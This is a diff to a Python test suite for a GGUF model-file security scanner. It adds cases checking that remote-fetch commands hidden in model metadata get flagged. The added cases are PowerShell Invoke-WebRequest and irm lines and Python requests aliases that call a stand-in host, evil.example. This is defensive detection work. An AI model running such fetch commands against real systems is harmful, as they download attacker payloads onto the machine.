@@ -1459,7 +1459,11 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "fetch https://evil/p", "remote_fetch"),
         ("download", "Invoke-RestMethod https://evil/p", "remote_fetch"),
         ("download", "Invoke-WebRequest -OutFile /tmp/p https://evil.example/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -Headers @{'A'='B'} https://evil.example/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -Headers @{ 'A' = 'B' } https://evil.example/p", "remote_fetch"),
         ("download", "Invoke-WebRequest -Method Get https://evil/p", "remote_fetch"),
+        ("download", "irm -Headers @{'A'='B'} https://evil.example/p", "remote_fetch"),
+        ("download", "irm -Headers @{ 'A' = 'B' } https://evil.example/p", "remote_fetch"),
         ("download", "irm https://evil/p", "remote_fetch"),
         ("download", 'url=https://evil/p curl "$url"', "remote_fetch"),
         ("download", 'url=https://evil.example/payload.sh; curl "$url"', "remote_fetch"),
@@ -1556,6 +1560,24 @@ def test_gguf_metadata_remote_fetch_detects_alias_after_many_benign_aliases(tmp_
     benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
     value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
     path = create_mock_gguf(tmp_path / "capped-client-aliases.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_later_alias_after_benign_omitted_alias(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
+    value = (
+        f"{benign_aliases}\n"
+        "import requests as benign_client\n"
+        "import requests as target_client\n"
+        "target_client.delete('https://evil.example/payload')"
+    )
+    path = create_mock_gguf(tmp_path / "capped-later-client-alias.gguf", metadata={"callback": value})
 
     result = GgufScanner().scan(str(path))
 
